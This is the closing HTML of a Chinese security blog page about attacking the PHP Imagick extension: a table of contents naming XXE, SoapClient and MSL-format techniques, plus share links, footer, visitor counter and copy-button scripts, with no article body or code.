+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E5%BE%81"><span class="toc-number">1.1.</span> <span class="toc-text">特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SoapClient"><span class="toc-number">1.2.</span> <span class="toc-text">SoapClient</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POD"><span class="toc-number">1.3.</span> <span class="toc-text">POD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SoapClient-SimpleXMLElement-XXE"><span class="toc-number">1.4.</span> <span class="toc-text">SoapClient&#x2F;SimpleXMLElement XXE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0"><span class="toc-number">2.</span> <span class="toc-text">学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83"><span class="toc-number">2.1.</span> <span class="toc-text">核心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSL-Format"><span class="toc-number">2.2.</span> <span class="toc-text">MSL Format</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E6%B4%81"><span class="toc-number">2.2.1.</span> <span class="toc-text">简洁</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.2.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#VID-Scheme"><span class="toc-number">2.2.3.</span> <span class="toc-text">VID Scheme</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">3.</span> <span class="toc-text">结语</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/&text=php-imagick拓展相关打法"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/&title=php-imagick拓展相关打法"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/&is_video=false&description=php-imagick拓展相关打法"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=php-imagick拓展相关打法&body=Check out this article: https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/&title=php-imagick拓展相关打法"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/&title=php-imagick拓展相关打法"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/&title=php-imagick拓展相关打法"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/&title=php-imagick拓展相关打法"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/&name=php-imagick拓展相关打法&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/php-imagick%E6%8B%93%E5%B1%95%E7%9B%B8%E5%85%B3%E6%89%93%E6%B3%95/&t=php-imagick拓展相关打法"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
